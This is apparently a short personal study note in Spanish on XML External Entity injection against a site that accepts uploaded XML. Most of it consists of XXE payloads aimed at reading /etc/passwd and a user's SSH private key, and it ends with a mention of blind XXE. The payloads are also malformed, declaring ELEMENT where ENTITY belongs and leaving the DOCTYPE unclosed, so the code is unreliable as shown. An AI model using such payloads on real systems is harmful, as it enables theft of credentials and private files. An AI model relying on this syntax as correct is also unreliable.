XML External Entity esta es una vulnerabilida en la por medio de una estrucutra *XML* a travez de la declaracion de entidades podemos ver archivos locales e incluso a ejecutar comandos.

Supongamos el caso de una pagina web donde puedes subir archivos *XML* conteniendo ciertas etiquetas en el archivo.

- Elements
- Author
- Subject
- Content

``` xml
<elements>
	<Author>S4tisfacti0n</Author>
	<Subject>Es una prueba</Subject>
	<Content>example</Content>
</elements>
```

y  nosotros subimos este archivo y podemo ver que carga este contenido en la web de manera interpretada.

Asi que podemos aprovechar esto e inyectar entidades para despues con un gruapper de tipo file y hacer un poco de [[LFI & RFI|LFI]].

``` xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
	<!ELEMENT foo ANY >
	<!ELEMENT xxe SYSTEM "file:///etc/passwd"]
<elements>
	<Author>&xxe;</Author> <!-- Mostramos el valor de la variable xxe --> 
	<Subject>Es una prueba</Subject>
	<Content>example</Content>
</elements>
```

Igual mente podemos robar la llave privada de la siguiente forma
``` xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
	<!ELEMENT foo ANY >
	<!ELEMENT xxe SYSTEM "file:///home/s4tisfacti0n/.ssh/id_rsa"]
<elements>
	<Author>&xxe;</Author> <!-- Mostramos el valor de la variable xxe --> 
	<Subject>Es una prueba</Subject>
	<Content>example</Content>
</elements>
```

Tambien existe una tecnica casi igual a esta solo que en esta no puedes ver lo que representa ese *XML* en ese caso tendriamos que montarnos nuestras propias entidades y ser llamadas por la maquina victima.